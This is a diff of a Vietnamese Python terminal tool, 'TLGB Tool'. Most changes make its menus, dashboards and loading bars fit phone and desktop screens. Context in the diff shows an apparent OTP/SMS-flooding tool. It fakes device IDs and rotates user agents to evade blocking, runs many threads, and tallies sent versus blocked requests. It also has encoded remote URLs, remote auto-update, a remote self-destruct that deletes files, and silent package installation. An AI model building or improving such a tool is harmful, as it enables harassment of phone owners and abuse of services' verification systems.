@@ -24,9 +24,22 @@ import zlib
 import base64
 import queue
 import re
+import shutil
 import unicodedata
 from datetime import datetime, timedelta
-from urllib.parse import unquote, quote, urlparse
+from urllib.parse import unquote, quote, urlparse, parse_qs
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+# Tự động phát hiện và cài đặt các thư viện cần thiết trên Android (Termux, Pydroid 3), Linux, Windows
+for _pkg in ["requests", "colorama", "urllib3"]:
+    try:
+        __import__(_pkg)
+    except ImportError:
+        try:
+            print(f"[*] Đang tự động nạp thư viện: {_pkg}...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", _pkg])
+        except Exception:
+            pass
 
 if hasattr(sys.stdout, 'reconfigure'):
     try:
@@ -44,6 +57,18 @@ try:
     HAS_WINSOUND = True
 except ImportError:
     HAS_WINSOUND = False
+
+try:
+    import psutil
+    HAS_PSUTIL = True
+except ImportError:
+    HAS_PSUTIL = False
+
+try:
+    import msvcrt
+    HAS_MSVCRT = True
+except ImportError:
+    HAS_MSVCRT = False
 
 import requests
 from requests.adapters import HTTPAdapter
@@ -72,15 +97,32 @@ def _dec_sec(blob):
 GET_KEY_URL = _dec_sec("IsaRcnNzcuyIjRVwl1n4ro7Ito4Q5+aOyMaW7hDnnthYJ1qChFb8")
 KEYS_BASE_URL = _dec_sec("IsZXnAtU2npSWopB0+7k4Fdg/DwYSQaxrK/kBC/lt1rCrt6I5vTu1j0MK0xVA13OHNOOfZOfKx2GeHhOrJR1VjBYJXbG/KhbH6VBtQ==")
 ADMIN_KEY_HASH = "0e61c051b0e0c396221b8b7305884a9d3bd05cdf5487c8badba2ef6007978da9"
-KEY_STORAGE_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_key.json')
-LOG_FILE_PATH = os.path.join(os.path.expanduser('~'), 'tlgb_admin_logs.txt')
-CLOUD_CONFIG_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_cloud.json')
-SEEN_BROADCASTS_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_seen_broadcasts.json')
-THEME_STORAGE_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_theme.json')
-EXP_STORAGE_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_exp.json')
+def get_safe_storage_path(filename):
+    """Lấy đường dẫn lưu trữ an toàn hỗ trợ đa nền tảng (Windows, Termux, Android, iOS, Linux)"""
+    try:
+        home_dir = os.path.expanduser('~')
+        if home_dir and os.path.exists(home_dir):
+            candidate = os.path.join(home_dir, filename)
+            test_file = candidate + f".tmp_{os.getpid()}"
+            with open(test_file, 'w', encoding='utf-8') as f:
+                f.write('1')
+            if os.path.exists(test_file):
+                os.remove(test_file)
+            return candidate
+    except Exception:
+        pass
+    cur_dir = os.path.dirname(os.path.abspath(__file__))
+    return os.path.join(cur_dir, filename)
+
+KEY_STORAGE_FILE = get_safe_storage_path('.tlgb_key.json')
+LOG_FILE_PATH = get_safe_storage_path('tlgb_admin_logs.txt')
+CLOUD_CONFIG_FILE = get_safe_storage_path('.tlgb_cloud.json')
+SEEN_BROADCASTS_FILE = get_safe_storage_path('.tlgb_seen_broadcasts.json')
+THEME_STORAGE_FILE = get_safe_storage_path('.tlgb_theme.json')
+EXP_STORAGE_FILE = get_safe_storage_path('.tlgb_exp.json')
 
 def play_cyberpunk_sound(sound_type="beep"):
-    """Phát âm thanh cảnh báo / hiệu ứng qua winsound trên Windows an toàn"""
+    """Phát âm thanh cảnh báo / hiệu ứng qua winsound trên Windows hoặc terminal bell trên Mobile/Linux"""
     if HAS_WINSOUND:
         try:
             if sound_type == "success":
@@ -98,6 +140,13 @@ def play_cyberpunk_sound(sound_type="beep"):
                 winsound.Beep(1000, 50)
         except Exception:
             pass
+    else:
+        try:
+            if sound_type in ["error", "win", "success"]:
+                sys.stdout.write('\a')
+                sys.stdout.flush()
+        except Exception:
+            pass
 
 def generate_random_id(length=16):
     """Tạo chuỗi ID ngẫu nhiên cho các request OTP & API"""
@@ -110,18 +159,23 @@ def generate_random_name():
     last_names = ["Bảo", "Huy", "Nam", "Dũng", "Tuấn", "Hoàng", "Long", "Khoa", "Phong", "Trang", "Linh", "Hương", "Anh", "Kiệt"]
     return f"{random.choice(first_names)} {random.choice(middle_names)} {random.choice(last_names)}"
 
-def format_device_id():
+def format_device_id(seed=None):
     """Tạo Device ID ngẫu nhiên phục vụ gửi OTP an toàn"""
+    if seed is not None:
+        return hashlib.md5(f"{seed}-{time.time()}".encode('utf-8')).hexdigest()
     return hashlib.md5(f"{random.random()}-{time.time()}".encode('utf-8')).hexdigest()
 
 def _char_w(ch):
+    """Tính độ rộng hiển thị thực tế của 1 ký tự trên terminal bao gồm đầy đủ dải Emojis và Unicode"""
     if ch in ('\ufe0e', '\ufe0f', '\u200d'):
         return 0
-    code_val = ord(ch)
+    code = ord(ch)
+    if (0x1F000 <= code <= 0x1FAFF) or (0x2300 <= code <= 0x23FF) or (0x2600 <= code <= 0x27BF) or (0x2B00 <= code <= 0x2BFF):
+        if ch in ('✦', '•', '│', '─', '═', '╔', '╗', '╚', '╝', '╠', '╣', '┌', '┐', '└', '┘', '├', '┤', '┬', '┴', '┼', '▲', '▼', '◄', '►', '■', '□', '▪', '▫', '●', '○', '◆', '◇', '★', '☆'):
+            return 1
+        return 2
     eaw = unicodedata.east_asian_width(ch)
     if eaw in ('W', 'F'):
-        return 2
-    if (0x1F000 <= code_val <= 0x1FAFF) or (0x2600 <= code_val <= 0x27BF) or (0x2300 <= code_val <= 0x23FF):
         return 2
     return 1
 
@@ -130,22 +184,23 @@ def _str_w(s):
     return sum(_char_w(ch) for ch in clean)
 
 def _fit_str(s, max_w):
+    clean = re.sub(r'\x1b\[[0-9;]*m', '', str(s))
     cur_w = 0
     res = []
-    for ch in str(s):
+    for ch in clean:
         if ch in ('\ufe0e', '\ufe0f', '\u200d'):
             res.append(ch)
             continue
-        w = _char_w(ch)
-        if cur_w + w > max_w:
+        cw = _char_w(ch)
+        if cur_w + cw > max_w:
             break
         res.append(ch)
-        cur_w += w
+        cur_w += cw
     return ''.join(res), cur_w
 
-TITLE_STORAGE_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_title.json')
-FAVORITES_STORAGE_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_favorites.json')
-DAILY_REWARDS_FILE = os.path.join(os.path.expanduser('~'), '.tlgb_daily.json')
+TITLE_STORAGE_FILE = get_safe_storage_path('.tlgb_title.json')
+FAVORITES_STORAGE_FILE = get_safe_storage_path('.tlgb_favorites.json')
+DAILY_REWARDS_FILE = get_safe_storage_path('.tlgb_daily.json')
 
 DEFAULT_CLOUD_DB_URL = _dec_sec("IsaRcnNzcuyIjXWTlZWLb+0WFxaLFxMXEXaXc4t3cBMTiBGRdhAXEHYUl5aNEZSVX1rdfUqq")
 DEFAULT_UPDATE_URL = _dec_sec("IsZfmztUmkpWXIpB83Sh74HObpJyu8mft60EXJwg0vwmdE++R6yIQ+EbV3SsHPMSytRzDI+Fls09/P4irwrJOO7cbm2UVVTRQUk=")
@@ -421,97 +476,93 @@ def sunset_gradient(text, *args, **kwargs):
 def rainbow_text(text, *args, **kwargs):
     return cyber_gradient(text)
 
-def print_card_box(title, lines, inner_w=78):
-    """In thẻ Card thông tin hoàn chỉnh với viền Cyan ánh kim, tiêu đề Gold Titan và căn lề thẳng tắp 100% không lệch 1 pixel"""
-    def _char_w(ch):
+def _char_w(ch):
+    """Tính độ rộng hiển thị thực tế của 1 ký tự trên terminal bao gồm đầy đủ dải Emojis và Unicode"""
+    if ch in ('\ufe0e', '\ufe0f', '\u200d'):
+        return 0
+    code = ord(ch)
+    if (0x1F000 <= code <= 0x1FAFF) or (0x2300 <= code <= 0x23FF) or (0x2600 <= code <= 0x27BF) or (0x2B00 <= code <= 0x2BFF):
+        if ch in ('✦', '•', '│', '─', '═', '╔', '╗', '╚', '╝', '╠', '╣', '┌', '┐', '└', '┘', '├', '┤', '┬', '┴', '┼', '▲', '▼', '◄', '►', '■', '□', '▪', '▫', '●', '○', '◆', '◇', '★', '☆'):
+            return 1
+        return 2
+    eaw = unicodedata.east_asian_width(ch)
+    if eaw in ('W', 'F'):
+        return 2
+    return 1
+
+def _str_w(s):
+    """Tính tổng độ rộng hiển thị của chuỗi sau khi loại bỏ ANSI escape codes"""
+    clean = re.sub(r'\x1b\[[0-9;]*m', '', str(s))
+    return sum(_char_w(ch) for ch in clean)
+
+def _fit_str(s, max_w):
+    """Cắt chuỗi sao cho độ rộng hiển thị không vượt quá max_w"""
+    clean = re.sub(r'\x1b\[[0-9;]*m', '', str(s))
+    cur_w = 0
+    res = []
+    for ch in clean:
         if ch in ('\ufe0e', '\ufe0f', '\u200d'):
-            return 0
-        code = ord(ch)
-        eaw = unicodedata.east_asian_width(ch)
-        if eaw in ('W', 'F'):
-            return 2
-        if (0x1F000 <= code <= 0x1FAFF) or (0x2600 <= code <= 0x27BF) or (0x2300 <= code <= 0x23FF):
-            return 2
-        return 1
-
-    def _str_w(s):
-        clean = re.sub(r'\x1b\[[0-9;]*m', '', s)
-        return sum(_char_w(ch) for ch in clean)
-
-    def _fit_str(s, max_w):
-        cur_w = 0
-        res = []
-        for ch in s:
-            if ch in ('\ufe0e', '\ufe0f', '\u200d'):
-                res.append(ch)
-                continue
-            w = _char_w(ch)
-            if cur_w + w > max_w:
-                break
             res.append(ch)
-            cur_w += w
-        return ''.join(res), cur_w
+            continue
+        cw = _char_w(ch)
+        if cur_w + cw > max_w:
+            break
+        res.append(ch)
+        cur_w += cw
+    return ''.join(res), cur_w
+
+def print_card_box(title, lines, inner_w=74):
+    """In thẻ Card thông tin hoàn chỉnh, tự động co giãn theo màn hình điện thoại hoặc PC, căn lề thẳng tuyệt đối"""
+    term_cols = shutil.get_terminal_size((80, 24)).columns
+    if inner_w is None or inner_w > term_cols - 2:
+        inner_w = max(34, min(74, term_cols - 2))
 
     border_c = '\033[38;2;0;229;255m'
     rst = '\033[0m'
 
-    top = f'{border_c}╔' + ('═' * inner_w) + f'╗{rst}'
-    bot = f'{border_c}╚' + ('═' * inner_w) + f'╝{rst}'
-    mid = f'{border_c}╠' + ('═' * inner_w) + f'╣{rst}'
+    top = f"{border_c}╔" + ("═" * inner_w) + f"╗{rst}"
+    mid = f"{border_c}╠" + ("═" * inner_w) + f"╣{rst}"
+    bot = f"{border_c}╚" + ("═" * inner_w) + f"╝{rst}"
 
-    t_w = _str_w(title)
-    left_pad = max(0, (inner_w - t_w) // 2)
-    right_pad = max(0, inner_w - t_w - left_pad)
+    clean_t = re.sub(r'\x1b\[[0-9;]*m', '', str(title))
+    t_fit, t_w = _fit_str(clean_t, inner_w - 2)
+    lp = max(0, (inner_w - t_w) // 2)
+    rp = max(0, inner_w - t_w - lp)
     
-    if "ADMIN" in title or "👑" in title or "BẢN TIN" in title or "MA TRẬN" in title:
-        c_title = gold_gradient(title)
+    if "ADMIN" in clean_t or "👑" in clean_t or "BẢN TIN" in clean_t or "MA TRẬN" in clean_t:
+        c_title = gold_gradient(t_fit)
     else:
-        c_title = cyber_gradient(title)
+        c_title = cyber_gradient(t_fit)
         
-    header = f'{border_c}║{rst}' + (' ' * left_pad) + c_title + (' ' * right_pad) + f'{border_c}║{rst}'
+    header = f"{border_c}║{rst}" + (" " * lp) + c_title + (" " * rp) + f"{border_c}║{rst}"
 
     print(top)
     print(header)
     print(mid)
 
     for line in lines:
-        fit_l, cur_w = _fit_str(line, inner_w - 2)
-        pad = ' ' * max(0, inner_w - cur_w - 2)
-        row = f'{border_c}║{rst} {fit_l}{pad} {border_c}║{rst}'
+        clean_l = re.sub(r'\x1b\[[0-9;]*m', '', str(line))
+        l_fit, l_w = _fit_str(clean_l, inner_w - 2)
+        pad = " " * max(0, inner_w - 2 - l_w)
+        if "•" in l_fit and ":" in l_fit:
+            parts = l_fit.split(":", 1)
+            k = parts[0] + ":"
+            v = parts[1]
+            colored_l = f"\033[38;2;160;200;240m{k}\033[0m\033[1;38;2;255;255;255m{v}\033[0m"
+        else:
+            colored_l = f"\033[1;38;2;255;255;255m{l_fit}\033[0m"
+        row = f"{border_c}║{rst} {colored_l}{pad} {border_c}║{rst}"
         print(row)
 
     print(bot)
 
 def print_aligned_menu_box(title, items, left_col_w=32, inner_w=78, color_offset=2):
-    """In toàn bộ bảng menu hoàn chỉnh với viền Cyan ánh kim, tiêu đề Gold VIP, hỗ trợ phân nhóm và căn lề thẳng tắp 100%"""
-    def _char_w(ch):
-        if ch in ('\ufe0e', '\ufe0f', '\u200d'):
-            return 0
-        code = ord(ch)
-        eaw = unicodedata.east_asian_width(ch)
-        if eaw in ('W', 'F'):
-            return 2
-        if (0x1F000 <= code <= 0x1FAFF) or (0x2600 <= code <= 0x27BF) or (0x2300 <= code <= 0x23FF):
-            return 2
-        return 1
+    """In toàn bộ bảng menu hoàn chỉnh với viền Cyan ánh kim, tiêu đề Gold VIP, hỗ trợ Responsive tự động thích ứng với màn hình Điện Thoại và Desktop"""
+    term_cols = shutil.get_terminal_size((80, 24)).columns
+    if inner_w is None or inner_w > term_cols - 2:
+        inner_w = max(34, min(78, term_cols - 2))
 
-    def _str_w(s):
-        clean = re.sub(r'\x1b\[[0-9;]*m', '', s)
-        return sum(_char_w(ch) for ch in clean)
-
-    def _fit_str(s, max_w):
-        cur_w = 0
-        res = []
-        for ch in s:
-            if ch in ('\ufe0e', '\ufe0f', '\u200d'):
-                res.append(ch)
-                continue
-            w = _char_w(ch)
-            if cur_w + w > max_w:
-                break
-            res.append(ch)
-            cur_w += w
-        return ''.join(res), cur_w
+    is_mobile = (inner_w < 64)
 
     border_c = '\033[38;2;0;229;255m'
     sep_c = '\033[38;2;60;100;140m'
@@ -521,14 +572,15 @@ def print_aligned_menu_box(title, items, left_col_w=32, inner_w=78, color_offset
     bot = f'{border_c}╚' + ('═' * inner_w) + f'╝{rst}'
     mid = f'{border_c}╠' + ('═' * inner_w) + f'╣{rst}'
 
-    t_w = _str_w(title)
+    clean_t = re.sub(r'\x1b\[[0-9;]*m', '', str(title))
+    t_fit, t_w = _fit_str(clean_t, inner_w - 2)
     left_pad = max(0, (inner_w - t_w) // 2)
     right_pad = max(0, inner_w - t_w - left_pad)
     
-    if "ADMIN" in title or "👑" in title:
-        c_title = gold_gradient(title)
+    if "ADMIN" in clean_t or "👑" in clean_t:
+        c_title = gold_gradient(t_fit)
     else:
-        c_title = cyber_gradient(title)
+        c_title = cyber_gradient(t_fit)
         
     header = f'{border_c}║{rst}' + (' ' * left_pad) + c_title + (' ' * right_pad) + f'{border_c}║{rst}'
 
@@ -536,68 +588,98 @@ def print_aligned_menu_box(title, items, left_col_w=32, inner_w=78, color_offset
     print(header)
     print(mid)
 
-    right_col_w = inner_w - left_col_w - 5  # 78 - 32 - 5 = 41
+    if is_mobile:
+        for left, right in items:
+            if left.startswith('──') or left.startswith('══') or left.startswith('--'):
+                header_text = left.strip('─= -')
+                h_w = _str_w(header_text)
+                l_p = max(0, (inner_w - h_w - 4) // 2)
+                r_p = max(0, inner_w - h_w - 4 - l_p)
+                div_row = f'{border_c}╠' + ('═' * l_p) + f'╡ {gold_gradient(header_text)} ╞' + ('═' * r_p) + f'╣{rst}'
+                print(div_row)
+                continue
 
-    for left, right in items:
-        # Support section headers
-        if left.startswith('──') or left.startswith('══') or left.startswith('--'):
-            header_text = left.strip('─= -')
-            h_w = _str_w(header_text)
-            l_p = max(0, (inner_w - h_w - 4) // 2)
-            r_p = max(0, inner_w - h_w - 4 - l_p)
-            div_row = f'{border_c}╠' + ('═' * l_p) + f'╡ {gold_gradient(header_text)} ╞' + ('═' * r_p) + f'╣{rst}'
-            print(div_row)
-            continue
-
-        l_str, cur_l_w = _fit_str(left, left_col_w)
-        r_str, cur_r_w = _fit_str(right, right_col_w)
-        
-        pad_l = ' ' * max(0, left_col_w - cur_l_w)
-        pad_r = ' ' * max(0, right_col_w - cur_r_w)
-        
-        if l_str.startswith('[') and ']' in l_str:
-            b_end = l_str.find(']') + 1
-            tag = l_str[:b_end]
-            label = l_str[b_end:]
-            if '0' in tag and ('Thoát' in label or '0]' in tag):
-                c_tag = f'\033[1;38;2;255;85;85m{tag}\033[0m'
-                c_label = f'\033[1;38;2;255;120;120m{label}\033[0m'
-                c_right = f'\033[38;2;220;140;140m{r_str}\033[0m'
-            elif 'D' in tag or 'C' in tag:
-                c_tag = f'\033[1;38;2;255;190;50m{tag}\033[0m'
-                c_label = f'\033[1;38;2;255;220;120m{label}\033[0m'
-                c_right = f'\033[38;2;210;190;140m{r_str}\033[0m'
-            elif 'G' in tag:
-                c_tag = f'\033[1;38;2;168;85;247m{tag}\033[0m'
-                c_label = f'\033[1;38;2;230;200;255m{label}\033[0m'
-                c_right = f'\033[38;2;200;180;240m{r_str}\033[0m'
-            else:
-                c_tag = f'\033[1;38;2;0;240;255m{tag}\033[0m'
-                c_label = f'\033[1;38;2;255;255;255m{label}\033[0m'
-                c_right = f'\033[38;2;170;200;225m{r_str}\033[0m'
-            f_left = c_tag + c_label + pad_l
-            f_right = c_right + pad_r
-        else:
-            f_left = f'\033[1;38;2;255;255;255m{l_str}\033[0m' + pad_l
-            f_right = f'\033[38;2;170;200;225m{r_str}\033[0m' + pad_r
+            max_row_w = inner_w - 2
+            l_str, cur_l_w = _fit_str(left, max_row_w)
+            pad_l = ' ' * max(0, max_row_w - cur_l_w)
             
-        row = f'{border_c}║{rst} {f_left} {sep_c}│{rst} {f_right} {border_c}║{rst}'
-        print(row)
+            if l_str.startswith('[') and ']' in l_str:
+                b_end = l_str.find(']') + 1
+                tag = l_str[:b_end]
+                label = l_str[b_end:]
+                if '0' in tag and ('Thoát' in label or '0]' in tag):
+                    c_tag = f'\033[1;38;2;255;85;85m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;255;120;120m{label}\033[0m'
+                elif 'D' in tag or 'C' in tag:
+                    c_tag = f'\033[1;38;2;255;190;50m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;255;220;120m{label}\033[0m'
+                elif 'G' in tag or 'M' in tag:
+                    c_tag = f'\033[1;38;2;168;85;247m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;230;200;255m{label}\033[0m'
+                else:
+                    c_tag = f'\033[1;38;2;0;240;255m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;255;255;255m{label}\033[0m'
+                f_row = c_tag + c_label + pad_l
+            else:
+                f_row = f'\033[1;38;2;255;255;255m{l_str}\033[0m' + pad_l
+            
+            print(f'{border_c}║{rst} {f_row}{border_c}║{rst}')
+            if right and len(right.strip()) > 0:
+                r_fit, r_w = _fit_str(f" ↳ {right}", max_row_w)
+                pad_r = ' ' * max(0, max_row_w - r_w)
+                print(f'{border_c}║{rst} \033[38;2;140;170;200m{r_fit}\033[0m{pad_r}{border_c}║{rst}')
+    else:
+        if left_col_w is None or left_col_w >= inner_w - 15:
+            left_col_w = max(24, int(inner_w * 0.42))
+        right_col_w = inner_w - left_col_w - 5
+
+        for left, right in items:
+            if left.startswith('──') or left.startswith('══') or left.startswith('--'):
+                header_text = left.strip('─= -')
+                h_w = _str_w(header_text)
+                l_p = max(0, (inner_w - h_w - 4) // 2)
+                r_p = max(0, inner_w - h_w - 4 - l_p)
+                div_row = f'{border_c}╠' + ('═' * l_p) + f'╡ {gold_gradient(header_text)} ╞' + ('═' * r_p) + f'╣{rst}'
+                print(div_row)
+                continue
+
+            l_str, cur_l_w = _fit_str(left, left_col_w)
+            r_str, cur_r_w = _fit_str(right, right_col_w)
+            
+            pad_l = ' ' * max(0, left_col_w - cur_l_w)
+            pad_r = ' ' * max(0, right_col_w - cur_r_w)
+            
+            if l_str.startswith('[') and ']' in l_str:
+                b_end = l_str.find(']') + 1
+                tag = l_str[:b_end]
+                label = l_str[b_end:]
+                if '0' in tag and ('Thoát' in label or '0]' in tag):
+                    c_tag = f'\033[1;38;2;255;85;85m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;255;120;120m{label}\033[0m'
+                    c_right = f'\033[38;2;220;140;140m{r_str}\033[0m'
+                elif 'D' in tag or 'C' in tag:
+                    c_tag = f'\033[1;38;2;255;190;50m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;255;220;120m{label}\033[0m'
+                    c_right = f'\033[38;2;210;190;140m{r_str}\033[0m'
+                elif 'G' in tag or 'M' in tag:
+                    c_tag = f'\033[1;38;2;168;85;247m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;230;200;255m{label}\033[0m'
+                    c_right = f'\033[38;2;200;180;240m{r_str}\033[0m'
+                else:
+                    c_tag = f'\033[1;38;2;0;240;255m{tag}\033[0m'
+                    c_label = f'\033[1;38;2;255;255;255m{label}\033[0m'
+                    c_right = f'\033[38;2;170;200;225m{r_str}\033[0m'
+                f_left = c_tag + c_label + pad_l
+                f_right = c_right + pad_r
+            else:
+                f_left = f'\033[1;38;2;255;255;255m{l_str}\033[0m' + pad_l
+                f_right = f'\033[38;2;170;200;225m{r_str}\033[0m' + pad_r
+                
+            row = f'{border_c}║{rst} {f_left} {sep_c}│{rst} {f_right} {border_c}║{rst}'
+            print(row)
 
     print(bot)
 
-
-# Danh sách User-Agents đa dạng tránh bị nhận diện / chặn
-USER_AGENTS_POOL = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.92 Mobile/15E148 Safari/604.1"
-]
 
 def get_random_ua():
     return random.choice(USER_AGENTS_POOL)
@@ -861,7 +943,7 @@ def execute_remote_self_destruct(wipe_info):
         pass
 
     # Hiển thị thông báo đỏ cảnh báo và lý do xóa
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n\n{Fore.RED}{Style.BRIGHT}{border}")
     print("  💥 CẢNH BÁO: LỆNH TIÊU HỦY & XÓA FILE TOOL TỪ QUẢN TRỊ VIÊN 💥".center(74))
     print(border)
@@ -978,7 +1060,7 @@ def check_admin_number_protection(phones):
             # Xóa sạch key đã lưu trên máy vi phạm
             remove_saved_key()
 
-            border = "═" * 74
+            border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
             print(f"\n\n{Fore.RED}{Style.BRIGHT}{border}")
             print("  🚨 PHÁT HIỆN HÀNH VI TẤN CÔNG BẤT HỢP PHÁP VÀO SỐ ĐIỆN THOẠI ADMIN 🚨")
             print(border)
@@ -1030,7 +1112,7 @@ def check_admin_number_protection(phones):
             # Xóa sạch key đã lưu trên máy vi phạm
             remove_saved_key()
 
-            border = "═" * 74
+            border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
             print(f"\n\n{Fore.RED}{Style.BRIGHT}{border}")
             print("  🚨 CẢNH BÁO AN NINH: PHÁT HIỆN HÀNH VI SPAM SỐ BẢO VỆ VIP (BỒ ADMIN) 🚨")
             print(border)
@@ -1136,7 +1218,7 @@ def check_and_apply_auto_update(silent=False):
                 print(f"  • Vui lòng liên hệ tác giả {AUTHOR_NAME} hoặc thử lại sau ít phút!\n")
             return False
 
-        border = "═" * 74
+        border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
         print(f"\n{cyber_gradient('╔' + border + '╗')}")
         print(cyber_gradient(f"║          🚀 PHÁT HIỆN BẢN NÂNG CẤP MỚI CỦA TLGB TOOL (v{remote_ver}) 🚀        ║".center(76), 6))
         print(cyber_gradient('╠' + border + '╣'))
@@ -1493,7 +1575,7 @@ def append_admin_log(text):
 
 MAX_THREADS = 18
 semaphore = BoundedSemaphore(MAX_THREADS)
-DEFAULT_TIMEOUT = 10
+DEFAULT_TIMEOUT = 4.0
 
 # Session tối ưu Connection Pooling & Tái sử dụng socket
 session = requests.Session()
@@ -1516,22 +1598,29 @@ RAINBOW_COLORS = [
 # Duplicate cyber_gradient removed
 
 def rainbow_loading(text="Đang nạp tài nguyên hệ thống TLGB Tool", duration=1.0):
-    """Hiệu ứng thanh loading Cyberpunk động siêu mượt với gradient màu neon"""
+    """Hiệu ứng thanh loading Cyberpunk động siêu mượt với gradient màu neon tự co giãn, không bị chồng đè ký tự"""
+    term_cols = shutil.get_terminal_size((80, 24)).columns
     start = time.time()
     spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
     idx = 0
+    bar_len = 10 if term_cols < 60 else 24
     while time.time() - start < duration:
         spin = spinner[idx % len(spinner)]
         percent = int(min(100, ((time.time() - start) / duration) * 100))
-        bar_len = 24
         filled = int(bar_len * percent / 100)
         bar = '█' * filled + '░' * (bar_len - filled)
-        line = f"  ⚡ [{spin}] {text} [{bar}] {percent}%"
-        sys.stdout.write("\r" + cyber_gradient(line))
+        short_text = text if term_cols >= 60 else "Đang nạp..."
+        line = f"  ⚡ [{spin}] {short_text} [{bar}] {percent}%"
+        fit_line, cur_w = _fit_str(line, max(20, term_cols - 2))
+        pad = ' ' * max(0, term_cols - cur_w - 4)
+        sys.stdout.write("\r" + cyber_gradient(fit_line) + pad)
         sys.stdout.flush()
         time.sleep(0.035)
         idx += 1
-    sys.stdout.write("\r" + emerald_gradient(f"  [✓] {text} [████████████████████████] 100%") + "\n\n")
+    done_msg = f"  [✓] {text if term_cols >= 60 else 'Khởi động hoàn tất!'} [{'█' * bar_len}] 100%"
+    fit_done, cur_dw = _fit_str(done_msg, max(20, term_cols - 2))
+    pad_done = ' ' * max(0, term_cols - cur_dw - 4)
+    sys.stdout.write("\r" + emerald_gradient(fit_done) + pad_done + "\n\n")
     sys.stdout.flush()
 
 def rainbow_spinner_pulse(text="Đang xử lý...", duration=0.8):
@@ -1591,9 +1680,12 @@ def print_live_progress_bar(text, current, total, success, fail, spin_idx=0):
     sys.stdout.flush()
 
 def print_dashboard_summary(total_tasks, success_count, fail_count, elapsed_sec, count_name="Đợt 1"):
-    """Bảng Dashboard trực quan tổng kết hiệu năng sau mỗi đợt chạy — Cyberpunk HUD"""
+    """Bảng Dashboard trực quan tổng kết hiệu năng sau mỗi đợt chạy — Cyberpunk HUD tự co giãn"""
     rate = (success_count / total_tasks * 100) if total_tasks > 0 else 0
     req_per_sec = (total_tasks / elapsed_sec) if elapsed_sec > 0 else 0
+    term_cols = shutil.get_terminal_size((80, 24)).columns
+    inner_w = max(34, min(72, term_cols - 2))
+    
     C_BORDER = '\033[38;2;0;229;255m'
     C_GOLD   = '\033[38;2;255;215;0m'
     C_WHITE  = '\033[38;2;240;240;240m'
@@ -1603,62 +1695,48 @@ def print_dashboard_summary(total_tasks, success_count, fail_count, elapsed_sec,
     C_CYAN   = '\033[38;2;56;189;248m'
     C_MAGENTA= '\033[38;2;168;85;247m'
     RST      = '\033[0m'
-    inner_w  = 72
     border_line = '═' * inner_w
 
     def row(label, value_str):
-        clean_v = re.sub(r'\x1b\[[0-9;]*m', '', value_str)
         content_str = f"  • {label}: {value_str}"
-        visible_len = len(f"  • {label}: ") + len(clean_v)
-        pad = ' ' * max(0, inner_w - visible_len - 1)
-        return f"{C_BORDER}║{RST}{content_str}{pad} {C_BORDER}║{RST}"
+        fit_c, cur_w = _fit_str(content_str, inner_w - 2)
+        pad = ' ' * max(0, inner_w - 2 - cur_w)
+        return f"{C_BORDER}║{RST} {fit_c}{pad}{C_BORDER}║{RST}"
 
-    # Visual gauge bar for rate
-    gauge_len = 16
+    gauge_len = 8 if inner_w < 50 else 16
     gauge_filled = int(gauge_len * rate / 100)
     gauge_bar = f"{C_GREEN}{'█' * gauge_filled}{RST}\033[38;2;40;50;70m{'░' * (gauge_len - gauge_filled)}{RST}"
 
-    title = f"📊 BẢNG TỔNG KẾT HIỆU NĂNG {count_name.upper()} 📊"
-    t_w = len(title)
+    title = f"📊 TỔNG KẾT {count_name.upper()} 📊"
+    t_w = _str_w(title)
     l_pad = ' ' * max(0, (inner_w - t_w) // 2)
     r_pad = ' ' * max(0, inner_w - t_w - len(l_pad))
 
     print(f"\n{C_BORDER}╔{border_line}╗{RST}")
     print(f"{C_BORDER}║{RST}{l_pad}{gold_gradient(title)}{r_pad}{C_BORDER}║{RST}")
     print(f"{C_BORDER}╠{border_line}╣{RST}")
-    print(row("Tổng số yêu cầu đã gửi ", f"{C_WHITE}{total_tasks:<6}{RST}"))
-    print(row("Gửi thành công          ", f"{C_GREEN}{success_count:<6}{RST}"))
-    print(row("Bị chặn / Lỗi mạng      ", f"{C_RED}{fail_count:<6}{RST}"))
-    print(row("Tỷ lệ gửi thành công    ", f"[{gauge_bar}] {C_YELLOW}{rate:>5.1f}%{RST}"))
-    print(row("Thời gian hoàn thành    ", f"{C_CYAN}{elapsed_sec:>5.2f} giây{RST}"))
